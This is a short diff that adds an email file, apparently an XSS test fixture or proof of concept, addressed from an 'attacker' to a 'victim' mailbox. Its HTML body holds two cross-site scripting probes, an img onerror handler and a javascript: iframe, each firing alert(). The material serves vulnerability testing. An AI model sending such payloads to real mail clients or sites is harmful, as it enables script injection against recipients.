@@ -1,0 +1,8 @@
+From: <attacker@attacker.com>
+Subject: xss_test
+To: victim@eyou.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<img src=x onerror=alert(1)>
+<iframe src=javascript:alert(2)>
